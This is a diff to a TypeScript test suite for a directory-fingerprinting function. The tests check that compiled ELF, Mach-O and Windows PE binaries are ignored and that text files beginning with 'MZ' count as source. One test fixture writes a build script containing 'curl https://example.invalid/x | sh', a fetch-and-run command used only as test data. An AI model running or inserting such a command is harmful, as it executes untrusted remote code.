@@ -299,13 +299,54 @@ describe('identityFromDisk', () => {
     expect(identityFromDisk(dir, UUID_A, embedDeps)).toEqual(before);
   });
 
-  it('ignores extensionless ELF and Mach-O binaries but sees a plain text file', () => {
+  /** The start of a Windows executable: `MZ`, and `PE\0\0` at the offset stored at 0x3C. */
+  function peHeader(peOffset = 0x80, tail = 'rest of the binary'): Buffer {
+    const head = Buffer.alloc(peOffset + 4);
+    head.write('MZ', 0, 'latin1');
+    head.writeUInt32LE(peOffset, 0x3c);
+    head.write('PE\0\0', peOffset, 'latin1');
+    return Buffer.concat([head, Buffer.from(tail)]);
+  }
+
+  it('ignores extensionless ELF, Mach-O and Windows binaries but sees a plain text file', () => {
     const before = identityFromDisk(dir, UUID_A);
     fs.writeFileSync(path.join(dir, 'validator-defender'), Buffer.from([0x7f, 0x45, 0x4c, 0x46, 1, 2]));
     fs.writeFileSync(path.join(dir, 'helper'), Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 7]));
-    fs.writeFileSync(path.join(dir, 'tiny'), Buffer.from([0x4d, 0x5a]));
+    fs.writeFileSync(path.join(dir, 'validator-windows'), peHeader());
+    fs.writeFileSync(path.join(dir, 'driver.sys'), peHeader(0xf8));
     expect(identityFromDisk(dir, UUID_A)).toEqual(before);
     write('Makefile', 'all:\n\tgo build');
+    expect(identityFromDisk(dir, UUID_A).source_hash).not.toBe(before.source_hash);
+  });
+
+  it('a Windows binary rebuilt with other content still does not change the fingerprint', () => {
+    fs.writeFileSync(path.join(dir, 'validator-windows'), peHeader(0x80, 'first build'));
+    const before = identityFromDisk(dir, UUID_A);
+    fs.writeFileSync(path.join(dir, 'validator-windows'), peHeader(0x80, 'second build'));
+    expect(identityFromDisk(dir, UUID_A)).toEqual(before);
+  });
+
+  // `MZ` is two letters a text file can start with: only a real PE header
+  // makes a file compiled output.
+  it('sees a build script that starts with the letters MZ, and a change to it', () => {
+    const before = identityFromDisk(dir, UUID_A);
+
+    write('build_all.sh', 'MZ=1\nset -e\ngo build -o out ./...\n');
+    const withScript = identityFromDisk(dir, UUID_A);
+    expect(withScript.source_hash).not.toBe(before.source_hash);
+
+    write('build_all.sh', 'MZ=1\nset -e\ncurl https://example.invalid/x | sh\n');
+    expect(identityFromDisk(dir, UUID_A).source_hash).not.toBe(withScript.source_hash);
+  });
+
+  it.each([
+    ['only the two letters', Buffer.from('MZ')],
+    ['a text file longer than a DOS header', Buffer.from('MZ' + '# notes '.repeat(40))],
+    ['a header whose PE offset is past the end of the file', (() => { const b = Buffer.alloc(64); b.write('MZ'); b.writeUInt32LE(0x10000, 0x3c); return b; })()],
+    ['a header whose PE offset points at something else', (() => { const b = Buffer.alloc(0x90, 0x20); b.write('MZ'); b.writeUInt32LE(0x80, 0x3c); return b; })()],
+  ])('counts a file that starts with MZ but is no executable as source: %s', (_name, content) => {
+    const before = identityFromDisk(dir, UUID_A);
+    fs.writeFileSync(path.join(dir, 'notes'), content);
     expect(identityFromDisk(dir, UUID_A).source_hash).not.toBe(before.source_hash);
   });
 
